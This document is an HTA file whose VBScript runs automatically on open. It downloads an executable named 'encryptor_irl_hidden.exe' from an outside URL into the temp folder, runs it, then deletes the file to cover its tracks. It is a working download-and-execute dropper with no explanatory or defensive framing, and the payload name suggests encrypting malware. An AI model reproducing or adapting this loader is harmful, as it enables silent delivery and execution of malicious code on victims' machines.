<html>
<head>
    <title>Download and Execute EXE</title>
    <HTA:APPLICATION 
        APPLICATIONNAME="Download and Execute EXE" 
        BORDER="thin" 
        SCROLL="no" 
        SINGLEINSTANCE="yes" 
        SYSMENU="no">
</head>
<body>
    <script language="VBScript">
        Sub DownloadAndExecute
            Dim objXMLHTTP, objStream, objShell
            Dim url, tempFile, tempPath
            
            url = "https://fecdor.github.io/history-protector/encryptor_irl_hidden.exe"  ' Replace with the URL of your EXE
            
            ' Create objects
            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
            Set objStream = CreateObject("ADODB.Stream")
            Set objShell = CreateObject("WScript.Shell")
            
            ' Get the path to the TEMP directory
            tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
            
            ' Generate a temporary filename
            tempFile = tempPath & "\tempfile.exe"
            
            ' Open connection and download the file into memory
            objXMLHTTP.Open "GET", url, False
            objXMLHTTP.Send
            If objXMLHTTP.Status = 200 Then
                objStream.Type = 1  ' Binary data
                objStream.Open
                objStream.Write objXMLHTTP.responseBody
                objStream.SaveToFile tempFile, 2  ' Save to temporary file
                objStream.Close
                
                ' Execute the EXE
                objShell.Run Chr(34) & tempFile & Chr(34), 1, True
                ' Wait briefly for execution to complete
                WScript.Sleep 5000
                ' Delete the temporary file after execution
                objShell.Run "cmd /c del " & Chr(34) & tempFile & Chr(34), 0, True
            Else
                MsgBox "Error downloading file."
            End If
            
            ' Clean up
            Set objXMLHTTP = Nothing
            Set objStream = Nothing
            Set objShell = Nothing
        End Sub
        
        ' Call the function to download and execute
        DownloadAndExecute
    </script>
</body>
</html>
